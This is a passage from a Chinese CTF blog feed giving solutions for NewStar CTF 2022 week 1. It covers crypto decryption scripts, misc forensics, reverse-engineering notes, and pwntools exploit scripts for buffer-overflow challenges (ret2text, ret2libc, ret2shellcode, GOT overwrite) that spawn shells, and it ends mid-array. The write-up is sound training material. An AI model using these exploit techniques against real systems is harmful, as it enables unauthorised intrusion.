zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 16</span><br><span class="line"></span><br><span class="line">guess=1202031004</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;newstar-ctf-2022-week2-wp&quot;&gt;Newstar Ctf 2022| week2 wp&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;Newstar Ctf 2022第二周题目的wp。&lt;/p&gt;
&lt;!-- toc --&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a hre</summary>
      
    
    
    
    <category term="match" scheme="https://feverhu.github.io/categories/match/"/>
    
    
    <category term="RSA" scheme="https://feverhu.github.io/tags/RSA/"/>
    
    <category term="php" scheme="https://feverhu.github.io/tags/php/"/>
    
    <category term="python" scheme="https://feverhu.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Newstar CTF 2022 week1</title>
    <link href="https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/"/>
    <id>https://feverhu.github.io/2022/10/29/Newstar-CTF-2022-week1/</id>
    <published>2022-10-29T14:28:10.000Z</published>
    <updated>2022-10-29T14:57:07.311Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="newstar-2022-week1">Newstar 2022 |week1</span></h1><p>一个月的newstar比赛，提供了一次很好的入门机会，边学边做，提高了很多。在此感谢出题的师傅们。直到现在有时间整理下题目做法，开始陆续写写wp。我还专门注册了一个新号上去看看能不能参加，现在也行，给出题人和buu平台点个赞！</p><p><strong>week1</strong>的题目比较简单，在此复现和记录一下。入口链接：https://buuoj.cn/match/matches/146</p><!-- toc --><ul><li><a href="#crypto">Crypto</a><ul><li><a href="#caeser">caeser</a></li><li><a href="#吉奥万巴蒂斯塔贝拉索先生的密码">吉奥万·巴蒂斯塔·贝拉索先生的密码</a></li><li><a href="#easyxor">easyxor</a></li><li><a href="#rsa_begin">RSA_begin</a></li><li><a href="#chaos">chaos</a></li></ul></li><li><a href="#misc">Misc</a><ul><li><a href="#yesec-no-drumsticks-1">Yesec no drumsticks 1</a></li><li><a href="#qsdzs-girlfriend-1">qsdz's girlfriend 1</a></li><li><a href="#look-my-eyes">Look my eyes</a></li><li><a href="#ezsnake">EzSnake</a></li><li><a href="#奇怪的音频">奇怪的音频。</a></li></ul></li><li><a href="#pwn">Pwn</a><ul><li><a href="#ret2text">ret2text</a></li><li><a href="#calc">calc</a></li><li><a href="#ret2libc">ret2libc</a></li><li><a href="#ret2shellcode">ret2shellcode</a></li><li><a href="#fallw1nds-gift">fallw1nd’s gift</a></li></ul></li><li><a href="#reverse">Reverse</a><ul><li><a href="#hello_reverse">Hello_Reverse</a></li><li><a href="#baby_re">Baby_Re</a></li><li><a href="#pyre">Pyre</a></li><li><a href="#easyre">EasyRe</a></li><li><a href="#艾克体悟题">艾克体悟题</a></li></ul></li><li><a href="#web">Web</a><ul><li><a href="#http">HTTP</a></li><li><a href="#headheader">Head?Header!</a></li><li><a href="#我真的会谢">我真的会谢</a></li><li><a href="#notphp">NotPHP</a></li><li><a href="#word-for-you">Word-For-You</a></li></ul></li></ul><!-- tocstop --><h2><span id="crypto">Crypto</span></h2><h3><span id="caeser">caeser</span></h3><p>去随波逐流一键解密。</p><p><img src="1666968263288.png"></p><h3><span id="吉奥万巴蒂斯塔贝拉索先生的密码">吉奥万·巴蒂斯塔·贝拉索先生的密码</span></h3><p>维吉尼亚解密：https://www.guballa.de/vigenere-solver</p><p><img src="1666970210266.png"></p><p><img src="1666970221279.png"></p><h3><span id="easyxor">easyxor</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;9b919c9a8685cd8fa294c8a28c88cc89cea2ce9c878480&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line"></span><br><span class="line">x = <span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>) ^ <span class="number">0x9b</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">flag += <span class="built_in">chr</span>(cipher[i] ^ x)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;x0r_i5_qu1t3_3azy&#125;</span></span><br></pre></td></tr></table></figure><h3><span id="rsa_begin">RSA_begin</span></h3><p>这道题应该是本次密码最难的题目。</p><p><strong>level5</strong>：卡住了，问了问大佬。</p><p><img src="1.png"></p><p>这样的话，<span class="math inline">\(hint * e^e - 1\)</span>包含了<span class="math inline">\(p\)</span>这个质因数，可以和n求最大公约数解出来<span class="math inline">\(p\)</span>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Level 1:</span></span><br><span class="line">c = <span class="number">22160015525054597533062795679117215923801827397299805735087138192137742945881204146337349060934854888054628153923021387981306839951210090523829296521835965212118849043671673133979884712755090374758002677916820953359774554825569218497687506468472278309097929775388010403607769802840990547048001743970754496905</span></span><br><span class="line">p = <span class="number">6962443023774446497102092246794613339314677593117417573764609329949026862782472380488956732038459060928443992561763464365758383525259954798321350043810351</span></span><br><span class="line">q = <span class="number">9631855759661411029901156175243744760977799976661519182223576693685069000499866459636568713055906075171480855575061732016121299027658733834671035383233163</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">flag += long_to_bytes(<span class="built_in">pow</span>(c, d, p * q))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#Level 2:</span></span><br><span class="line">c = <span class="number">17250922799297131008803303235771955129</span></span><br><span class="line">n = <span class="number">134097988095851988085603926250918812377</span></span><br><span class="line">p = <span class="number">10094271714305059493</span></span><br><span class="line">q = <span class="number">13284562957208247589</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">flag += long_to_bytes(<span class="built_in">pow</span>(c, d, p * q))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Level 3:</span></span><br><span class="line">c = <span class="number">2776571135646565181849912433877522437622755332262910824866791711</span></span><br><span class="line">n = <span class="number">85793694792655420934945863688968944466300304898903354212780512650924132933351787673979641944071634528676901506049360194331553838080226562532784448832916022442020751986591703547743056267118831445759258041047213294368605599719242059474324548598203039032847591828382166845797857139844445858881218318006747115157</span></span><br><span class="line">flag += long_to_bytes(iroot(c, <span class="number">3</span>)[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Level 4:</span></span><br><span class="line">c = <span class="number">68588738085497640698861260094482876262596289469248772328560280530093163764972313090939471997156632421517452790632223565521726590730640805290182026911025142051864898712501214753986865172996090706657535814234291235489829621372021092488300236623525366939477695283380634188510950335639019458758643273802572617191</span></span><br><span class="line">e = <span class="number">51999725233581619348238930320668315462087635295211755849675812266270026439521805156908952855288255992098479180003264827305694330542325533165867427898010879823017054891520626992724274019277478717788189662456052796449734904215067032681345261878977193341769514961038309763898052908572726913209883965288047452751</span></span><br><span class="line">n = <span class="number">68816697240190744603903822351423855593899797203703723038363240057913366227564780805815565183450516726498872118491739132110437976570592602837245705802946829337567674506561850972973663435358068441037127926802688722648016352967768929007662772115485020718202683004813042834036078650571763978066558718285783045969</span></span><br><span class="line"><span class="keyword">import</span> RSAwienerHacker</span><br><span class="line">d=RSAwienerHacker.hack_RSA(e,n)</span><br><span class="line">flag += long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Level 5:</span></span><br><span class="line">c = <span class="number">1135954814335407362237156338232840769700916726653557860319741136149066730262056907097728029957898420630256832277578506404721904131425822963948589774909272408535427656986176833063600681390871582834223748797942203560505159946141171210061405977060061656807175913366911284450695116982731157917343650021723054666494528470413522258995220648163505549701953152705111304471498547618002847587649651689203632845303117282630095814054989963116013144483037051076441508388998829</span></span><br><span class="line">hint = <span class="number">611144874477135520868450203622074557606421849009025270666985817360484127602945558050689975570970227439583312738313767886380304814871432558985582586031211416586296452510050692235459883608453661597776103386009579351911278185434163016083552988251266501525188362673472772346212970459561496301631587043106524741903627979311997541301471894670374945556313285203740782346029579923650160327646876967315182335114575921178144825057359851607166387868294019144940296084605930</span></span><br><span class="line">n = <span class="number">1232865496850144050320992645475166723525103370117149219196294373695624167653495180701004894188767069545579706264513808335877905149818445940067870026924895990672091745229251935876434509430457142930654307044403355838663341948471348893414890261787326255632362887647279204029327042915224570484394917295606592360109952538313570951448278525753313335289675455996833500751672463525151201002407861423542656805624090223118747404488579783372944593022796321473618301206064979</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">tmp = <span class="built_in">pow</span>(e, e, n)</span><br><span class="line">p = GCD((hint * tmp) % n - <span class="number">1</span>, n)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line">q = n // (p * p)</span><br><span class="line">d = inverse(e, p * (p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">flag += long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3><span id="chaos">chaos</span></h3><p>这是一道基础爆破题目，题目比较长，不要被吓到。已知k1,k2和k(a_1, timea1, b_1, timeb1, xc_1, yc_1)，就可以直接利用LC求miu和omiga。然后爆破下就行了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k1, k2 = 3.967139695598587, 3.7926025078694305                                           </span><br><span class="line">k = [107, 99, 55, 198, 210, 56, 137, 44, 127, 25, 150, 113, 75, 215, 187, 132]           </span><br><span class="line">c = [23, 84, 105, 111, 230, 105, 97, 50, 58, 61, 25, 97, 57, 21, 175, 77, 102, 138, 120, 17, 66, 172, 52, 178, 101, 221, 109, 126, 71, 149, 63, 32, 56, 6, 134, 255, 110, 57, 15, 20, 116]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def init(): </span><br><span class="line">    sum, r = 0, 1</span><br><span class="line">    for i in range(16): </span><br><span class="line">        sum += k[i]</span><br><span class="line">        r ^= k[i]  </span><br><span class="line">    a_1 = (sum/256) % 1 </span><br><span class="line">    timea1 = 3 + int(1000 * a_1) % 30</span><br><span class="line">    b_1 = (r/256)</span><br><span class="line">    timeb1 = 3 + int(1000 * b_1) % 30</span><br><span class="line">    xc_1 = a_1 * b_1</span><br><span class="line">    yc_1 = (a_1 + b_1) % 1</span><br><span class="line">    print(&#x27;k1, k2 = %r, %r&#x27;%(k1, k2))</span><br><span class="line">    print(&#x27;k = %r&#x27;%k)</span><br><span class="line">    return (k1, k2), (a_1, timea1, b_1, timeb1, xc_1, yc_1)</span><br><span class="line"></span><br><span class="line">def LC(key, x, times, flags):</span><br><span class="line">    (k1, k2) = key</span><br><span class="line">    xn = []</span><br><span class="line">    xn.append(x)</span><br><span class="line">    if flags:</span><br><span class="line">        xn.append(1 - 2 * xn[0]**2)</span><br><span class="line">    else:</span><br><span class="line">        xn.append(k2 * xn[0]**3 + (1 - k2)*xn[0])</span><br><span class="line">    for i in range(times):</span><br><span class="line">        assert xn[i]&gt;=-1 and xn[i]&lt;=1 and xn[i+1]&gt;=-1 and xn[i+1]&lt;=1</span><br><span class="line">        if flags:</span><br><span class="line">            xn.append((1 - 2 * xn[i]**2)*(k1 * xn[i+1]**3 + (1 - k1)*xn[i+1]))</span><br><span class="line">        else:</span><br><span class="line">            xn.append((k2 * xn[i]**3 + (1 - k2)*xn[i])*(1 - 2 * xn[i+1]**2))</span><br><span class="line">    return xn[times + 1]</span><br><span class="line"></span><br><span class="line">def decrypt(key, data):</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    (k1, k2) = key</span><br><span class="line">    (a_1, timea1, b_1, timeb1, xc_1, yc_1) = data</span><br><span class="line">    miu, omiga = [], []</span><br><span class="line">    ta = timea1</span><br><span class="line">    tb = timeb1</span><br><span class="line">    for j in range(len(c)):</span><br><span class="line">        miu.append(LC(key, a_1, ta, 1))</span><br><span class="line">        omiga.append(LC(key, b_1, tb, 0))</span><br><span class="line">        for tmp in range(33, 127):</span><br><span class="line">            if c[j] == ((int(miu[-1] * 1000) + int(omiga[-1] * 1000)) ^ tmp) % 256:</span><br><span class="line">                flag += chr(tmp)</span><br><span class="line">        delta = c[j]/256</span><br><span class="line">        for i in range(3):</span><br><span class="line">            y = (yc_1 + delta) % 1</span><br><span class="line">            y = k1 * y**3 + (1 - k1) * y</span><br><span class="line">            x = xc_1</span><br><span class="line">            x = k2 * x**3 + (1 - k2) * x</span><br><span class="line">        ta = 3 + int(1000 * x) % 30</span><br><span class="line">        tb = 3 + int(1000 * y) % 30</span><br><span class="line">    return flag</span><br><span class="line"></span><br><span class="line">key, data = init()</span><br><span class="line">flag = decrypt(key, data)</span><br><span class="line">print(flag)</span><br><span class="line">#flag&#123;ii24nji9-8ckkpil1-5hiev3n6-1u24g07m&#125;</span><br></pre></td></tr></table></figure><h2><span id="misc">Misc</span></h2><h3><span id="yesec-no-drumsticks-1">Yesec no drumsticks 1</span></h3><p><img src="1666971333098.png"></p><h3><span id="qsdzs-girlfriend-1">qsdz's girlfriend 1</span></h3><p><img src="1666971521832.png"></p><p>用ARCHPR爆破。19900101开始到20200101，得到20031201。</p><p><img src="1666971627999.png"></p><p>用搜索引擎图片识别。</p><p>flag{Hikari_20031201}</p><h3><span id="look-my-eyes">Look my eyes</span></h3><p>SilentEye解密。</p><p><img src="1666971798719.png"></p><p><img src="1666971822266.png"></p><p>解码默认设置就行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tMMG9rX20zXzFuX215X2V5M3N9</span><br><span class="line"></span><br><span class="line">flag&#123;L0ok_m3_1n_my_ey3s&#125;</span><br></pre></td></tr></table></figure><h3><span id="ezsnake">EzSnake</span></h3><p>这道题有两种做法，可以直接改class，也可以反编译出java文件。</p><ul><li><p>反编译class，这也是我当时做法。首先用jd-gui打开，在actionPerformed函数中找到关键代码：</p><p><img src="1667019848752.png"></p></li></ul><p>将ezsnake.jar改成ezsnake.zip，解压。用jclasslib打开GamePanel.class文件。找到以下位置。</p><p><img src="1667020179931.png"></p><p><img src="1667020155135.png"></p><p>将289行114改成1，保存。回到解压文件夹的根目录：</p><p><img src="1667020357603.png"></p><p>选中这个目录中三个文件夹，压缩成zip,后缀改成.jar。便可以运行了。吃一个就能够出结果：</p><p><img src="1667020681801.png"></p><p>我是放到ps里面补全的，其他工具也行。</p><p>ZmxhZ3tZMHVfNHJlXzBuZV9vTmVfMG5FX3N0NFJ9=</p><p>flag{Y0u_4re_0ne_oNe_0nE_st4R}</p><ul><li><p>jd-gui输出src文件。然后用eclipse打开，修改114为1：</p><p><img src="1667022014024.png"></p></li></ul><h3><span id="奇怪的音频">奇怪的音频。</span></h3><p>这题也有两种做法，一种win和一种linux。</p><ul><li>windows方法比较简单。mmsstv中RX模式，开着声音直接可以解出来，但是存在扫不出来的概率，前一天扫出来了，后一天可能就没有扫出来。</li></ul><p><img src="1667022960737.png"></p><ul><li><p>利用linux的qsstv。直接解会报错，所以我们需要先修改一下文件。</p><p>首先去buuctf找到[UTCTF2020]sstv这道题。用audacity打开同时打开这两个文件。</p><p>然后把这道”奇怪的音频“的波形复制到[UTCTF2020]sstv这道题音频的波形上，覆盖源波形，就可以用qsstv读取了。</p><p><img src="1667024642603.png"></p></li></ul><h2><span id="pwn">Pwn</span></h2><p>简单题就直接贴代码了。都是python3。</p><h3><span id="ret2text">ret2text</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">pop_rdi_ret = 0x4007d3</span><br><span class="line">ret = 0x400566</span><br><span class="line">#context(log_level=&#x27;debug&#x27;)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">print(p.recv(timeout=1))</span><br><span class="line">payload = b&#x27;a&#x27; * 0x20 + b&#x27;b&#x27; * 8 + p64(ret) +p64(0x400708)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3><span id="calc">calc</span></h3><p>这应该算misc题目吧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">r = remote(&#x27;node4.buuoj.cn&#x27;, 25831)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">for i in range(100):</span><br><span class="line">s = r.recvline()</span><br><span class="line">Regex = r&#x27;(?=\?).*?(?&lt;=\=)&#x27;</span><br><span class="line">f = re.search(Regex,s.decode())</span><br><span class="line">f = f.group()[1:-1]</span><br><span class="line">f = f.replace(&#x27;x&#x27;, &#x27;*&#x27;)</span><br><span class="line">ans = eval(f)</span><br><span class="line">r.sendline(str(ans).encode())</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(b&#x27;cat flag&#x27;)</span><br><span class="line">print(r.recvline(timeout=1))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3><span id="ret2libc">ret2libc</span></h3><p>好多师傅讲的很明白了：https://blog.csdn.net/qq_40827990/article/details/86662079</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#0x0000000000400753 : pop rdi ; ret</span></span><br><span class="line">elf=ELF(<span class="string">&#x27; pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc_sh = libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">libc_puts_addr = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400753</span></span><br><span class="line">start = <span class="number">0x400698</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;time?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">32</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recvline())  </span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">base_addr = puts_addr - libc_puts_addr</span><br><span class="line">system_addr = base_addr + libc_system</span><br><span class="line">sh_addr = base_addr + libc_sh </span><br><span class="line">ret = <span class="number">0x40050e</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">32</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span>  + p64(ret) + p64(pop_rdi_ret) + p64(sh_addr) + p64(system_addr) + p64(start)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3><span id="ret2shellcode">ret2shellcode</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">print(len(shellcode))</span><br><span class="line">p = process(&quot;./pwn&quot;)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvline()</span><br><span class="line">payload = 0x30 * b&#x27;a&#x27; + 8 * b&#x27;b&#x27; + p64(0x233000)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3><span id="fallw1nds-gift">fallw1nd’s gift</span></h3><p>给了got表中puts指向的地址，也就是libc中put地址。然后在scanf输入got表中puts地址的值，为buf，在buf上输入libc中system地址，puts就变成了system，执行system('/bin/sh');</p><p><img src="1667030197038.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;fallw1nd_gift&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">libc_system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_puts_addr = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(puts_plt)</span><br><span class="line"><span class="built_in">print</span>(puts_got)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x401084</span></span><br><span class="line"><span class="comment">#0x4033f8</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./fallw1nd_gift&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">s = p.recvline().rstrip()</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr = <span class="built_in">int</span>(s.decode(),<span class="number">16</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;0x4033f8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">base_addr = puts_addr - libc_puts_addr</span><br><span class="line">system_addr = base_addr + libc_system</span><br><span class="line"></span><br><span class="line">payload = p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="reverse">Reverse</span></h2><h3><span id="hello_reverse">Hello_Reverse</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.rdata:00000001400032600000000DCflag&#123;h3llo_r</span><br><span class="line">strcpy(Source, &quot;3vers1ng_w0rld&#125;&quot;);</span><br><span class="line">flag&#123;h3llo_r3vers1ng_w0rld&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="baby_re">Baby_Re</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag = [#flag&#123;S0meth1ng_run_bef0re_main!&#125;0x66, 0x6D, 0x63, 0x64, 0x7F, 0x56, 54, 0x6A, 0x6D, 0x7D, 0x62, 58, 0x62, 0x6A, 0x51, 0x7D, </span><br><span class="line">    0x65, 0x7F, 0x4D, 0x71, 0x71, 0x73, 38, 0x65, 0x7D, 0x46, 0x77, 